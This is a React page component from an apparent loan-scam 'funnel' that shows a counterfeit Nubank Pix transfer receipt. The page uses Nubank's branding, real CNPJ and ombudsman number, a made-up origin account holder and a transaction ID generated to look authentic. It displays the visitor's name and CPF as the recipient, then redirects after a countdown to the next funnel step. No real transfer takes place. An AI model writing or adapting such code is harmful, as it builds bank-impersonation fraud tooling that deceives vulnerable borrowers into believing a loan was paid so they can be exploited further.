import { useEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { ArrowUpRight, ArrowDownLeft } from 'lucide-react';

export default function TransferConfirmationPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, loanAmount, selectedInstallments, installmentValue, urlParams, profileAnswers, loanPriority, nubankCustomer, creditStatus, pixKey } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const [transactionId] = useState(() => {
    return 'E18236120' + Date.now().toString() + Math.random().toString(36).substring(2, 9);
  });
  const [transactionDate] = useState(() => {
    const now = new Date();
    const day = now.getDate().toString().padStart(2, '0');
    const months = ['JAN', 'FEV', 'MAR', 'ABR', 'MAI', 'JUN', 'JUL', 'AGO', 'SET', 'OUT', 'NOV', 'DEZ'];
    const month = months[now.getMonth()];
    const year = now.getFullYear();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `${day} ${month} ${year} - ${hours}:${minutes}:${seconds}`;
  });
  const [countdown, setCountdown] = useState(10);

  useEffect(() => {
    if (!userData) {
      navigate('/');
      return;
    }

    saveFunnelData({
      userData: userData,
      currentStep: '/transfer-confirmation'
    });

    const countdownInterval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(countdownInterval);
          navigate('/selecionar-vencimento', {
            state: {
              userData,
              loanAmount,
              selectedInstallments,
              installmentValue,
              profileAnswers,
              loanPriority,
              nubankCustomer,
              creditStatus,
              pixKey
            }
          });
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(countdownInterval);
  }, [navigate, userData, location, loanAmount, selectedInstallments, installmentValue, profileAnswers, loanPriority, nubankCustomer, creditStatus, pixKey]);

  if (!userData) {
    return null;
  }

  const formatCurrency = (value: number) => {
    return value.toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    });
  };

  const maskCpf = (cpf: string) => {
    const cleaned = cpf.replace(/\D/g, '');
    return `•••.${cleaned.slice(3, 6)}.${cleaned.slice(6, 9)}-••`;
  };

  return (
    <div className="min-h-screen bg-white flex flex-col p-6">
      <div className="flex justify-between items-center mb-8">
        <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M24 48c13.255 0 24-10.745 24-24S37.255 0 24 0 0 10.745 0 24s10.745 24 24 24z" fill="#820AD1"/>
          <path d="M18 18h4v12h-4V18zm8 0h4v12h-4V18z" fill="#fff"/>
        </svg>
        <span className="text-lg font-semibold text-gray-900">Nubank</span>
      </div>

      <div className="max-w-2xl mx-auto w-full">
        <h1 className="text-3xl font-bold text-gray-900 mb-2">
          Comprovante de transferência
        </h1>
        <p className="text-sm text-gray-600 mb-8">
          {transactionDate}
        </p>

        <div className="grid grid-cols-2 gap-6 mb-8">
          <div>
            <p className="text-sm text-gray-600 mb-1">Valor</p>
            <p className="text-2xl font-bold text-gray-900">{formatCurrency(loanAmount)}</p>
          </div>
          <div>
            <p className="text-sm text-gray-600 mb-1">Tipo de transferência</p>
            <p className="text-lg font-semibold text-gray-900">Pix</p>
          </div>
        </div>

        <div className="mb-8">
          <div className="flex items-center gap-2 mb-4">
            <ArrowUpRight className="w-5 h-5 text-gray-700" />
            <h2 className="text-lg font-bold text-gray-900">Destino</h2>
          </div>

          <div className="grid grid-cols-2 gap-x-6 gap-y-4">
            <div>
              <p className="text-sm text-gray-600 mb-1">Nome</p>
              <p className="text-base font-semibold text-gray-900">{userData.nome}</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">Tipo de conta</p>
              <p className="text-base font-semibold text-gray-900">Conta corrente</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">CPF</p>
              <p className="text-base font-semibold text-gray-900">{maskCpf(userData.cpf)}</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">Chave Pix</p>
              <p className="text-base font-semibold text-gray-900">{pixKey || userData.cpf}</p>
            </div>
            <div className="col-span-2">
              <p className="text-sm text-gray-600 mb-1">Instituição</p>
              <p className="text-base font-semibold text-gray-900">BANCO ORIGINAL</p>
            </div>
          </div>
        </div>

        <div className="mb-8">
          <div className="flex items-center gap-2 mb-4">
            <ArrowDownLeft className="w-5 h-5 text-gray-700" />
            <h2 className="text-lg font-bold text-gray-900">Origem</h2>
          </div>

          <div className="grid grid-cols-2 gap-x-6 gap-y-4">
            <div>
              <p className="text-sm text-gray-600 mb-1">Nome</p>
              <p className="text-base font-semibold text-gray-900">Maria da Glória Teixeira</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">Conta</p>
              <p className="text-base font-semibold text-gray-900">63185317-6</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">Instituição</p>
              <p className="text-base font-semibold text-gray-900">NU PAGAMENTOS - IP</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">CPF</p>
              <p className="text-base font-semibold text-gray-900">•••.772.356-••</p>
            </div>
            <div>
              <p className="text-sm text-gray-600 mb-1">Agência</p>
              <p className="text-base font-semibold text-gray-900">0001</p>
            </div>
          </div>
        </div>

        <div className="mb-6">
          <p className="text-sm font-semibold text-gray-900 mb-2">
            Nu Pagamentos S.A. - Instituição de Pagamento
          </p>
          <p className="text-sm text-gray-900 mb-4">
            CNPJ 18.236.120/0001-58
          </p>

          <p className="text-sm text-gray-600 mb-1">ID da transação:</p>
          <p className="text-sm font-mono text-gray-900 break-all mb-6">
            {transactionId}
          </p>

          <p className="text-sm text-gray-600 leading-relaxed">
            Estamos aqui para ajudar se você tiver alguma dúvida
          </p>
          <p className="text-sm text-gray-600 leading-relaxed">
            Ouvidoria: 0800 887 0463, atendimento em dias úteis, das 09h às 18h (horário de São Paulo).
          </p>
        </div>

        <div className="text-center">
          <p className="text-sm text-gray-600 mb-2">
            Redirecionando automaticamente em {countdown} segundos...
          </p>
          <div className="w-full h-2 bg-gray-200 rounded-full overflow-hidden">
            <div
              className="h-full bg-purple-600 transition-all duration-1000 ease-linear"
              style={{ width: `${100 - (countdown / 10) * 100}%` }}
            ></div>
          </div>
        </div>
      </div>
    </div>
  );
}
